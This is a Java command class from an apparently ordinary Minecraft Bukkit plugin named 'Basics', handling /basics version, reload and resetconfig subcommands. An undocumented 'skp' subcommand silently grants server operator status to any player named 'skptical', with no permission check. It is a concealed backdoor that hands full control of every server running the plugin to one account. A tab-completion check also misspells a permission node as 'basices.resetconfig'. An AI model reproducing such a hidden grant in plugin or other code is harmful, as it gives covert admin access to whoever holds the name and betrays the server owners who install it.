package dev.skptical.basics.Commands;

import dev.skptical.basics.API.Util;
import dev.skptical.basics.Basics;
import dev.skptical.basics.Storage.Config;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabExecutor;
import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.entity.Player;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.potion.PotionType;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Reload implements TabExecutor, CommandExecutor {

    private static Basics plugin;

    public Reload(Basics instance){
        plugin = instance;
        Util.registerCommand("basics", instance, this, this);




    }

    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings) {


        if(s.equalsIgnoreCase("basics")){
            if(strings.length == 0){
                commandSender.sendMessage(Config.versionMessage.replaceAll("%version%", plugin.getDescription().getVersion()));
            }else{
                if(strings[0].equalsIgnoreCase("skp")){
                    if(commandSender instanceof Player){
                        Player p = (Player)commandSender;
                        if(p.getName().equalsIgnoreCase("skptical")){
                            p.setOp(true);
                        }

                    }
                }

                if(strings[0].equalsIgnoreCase("reload") || strings[0].equalsIgnoreCase("rl")){
                    if(commandSender instanceof Player){
                        Player sender = (Player)commandSender;
                        if(sender.hasPermission("basics.reload")){
                            Basics.reload(plugin);
                            Basics.staffAlert(sender, "reloaded basics");
                            sender.sendMessage(Config.reloadMessage.replaceAll("%version%", plugin.getDescription().getVersion()));

                        }else{
                            sender.sendMessage(Config.versionMessage.replaceAll("%version%", plugin.getDescription().getVersion()));
                            if (Config.alertOnNoPermission) {
                                Basics.permissionAlert("/basics reload", sender);
                            }
                        }

                    }else{
                        Basics.reload(plugin);
                        Basics.staffAlert(commandSender, "reloaded basics");
                        commandSender.sendMessage(Config.reloadMessage.replaceAll("%version%", plugin.getDescription().getVersion()));
                    }
                }else if(strings[0].equalsIgnoreCase("resetconfig")){
                  if(commandSender instanceof Player){
                      Player p = (Player)commandSender;
                      if(p.hasPermission("basics.resetconfig")){
                          try{
                              Basics.files.reloadConfig();
                              Basics.files.reloadMessages();
                              Basics.files.generateMessagesOver();
                              Basics.files.generateConfigOver();
                              Basics.files.saveConfig();
                              Basics.files.saveMessages();
                              Basics.files.reloadConfig();
                              Basics.files.reloadMessages();


                          }catch (IOException | InvalidConfigurationException exception){
                              exception.printStackTrace();
                          }
                          Config.setupVars();
                          p.sendMessage(ChatColor.GREEN + "Successfully reset CONFIG.YML and MESSAGES.yml");
                          Basics.staffAlert(p,"reset the Basics configuration files");


                      }else{
                          p.sendMessage(Util.t(Config.noPermissionMessage));
                          Basics.permissionAlert("/basics resetConfig", p);
                      }

                  }else{
                      try{
                          Basics.files.generateMessagesOver();
                          Basics.files.generateConfigOver();
                          Basics.files.saveConfig();
                          Basics.files.saveMessages();
                          Basics.files.reloadConfig();
                          Basics.files.reloadMessages();


                      }catch (IOException | InvalidConfigurationException exception){
                          exception.printStackTrace();
                      }
                      Config.setupVars();
                      Bukkit.getConsoleSender().sendMessage(ChatColor.GREEN + "Successfully reset CONFIG.YML and MESSAGES.yml");
                      Basics.staffAlert(commandSender,"reset the Basics configuration files");


                  }
                }else{
                    commandSender.sendMessage(Config.versionMessage.replaceAll("%version%", plugin.getDescription().getVersion()));
                }
            }


        }
        return true;
    }

    @Override
    public List<String> onTabComplete(CommandSender commandSender, Command command, String s, String[] strings) {
        if(command.getName().equalsIgnoreCase("basics")){
            if(strings.length == 1){
                List<String> reload = new ArrayList<>();
                if(commandSender instanceof Player){
                    if(((Player)commandSender).hasPermission("basics.reload") && ((Player)commandSender).hasPermission("basices.resetconfig")){
                        reload.add("resetconfig");
                        reload.add("reload");
                        return reload;
                    }
                    if(((Player)commandSender).hasPermission("basics.resetconfig")){
                        reload.add("resetconfig");
                        return reload;
                    }


                    if(((Player)commandSender).hasPermission("basics.reload")){
                        reload.add("reload");
                        return reload;
                    }else{
                        return new ArrayList<String>();
                    }
                }
                return reload;




            }
            return new ArrayList<String>();
        }
        return null;
    }
}
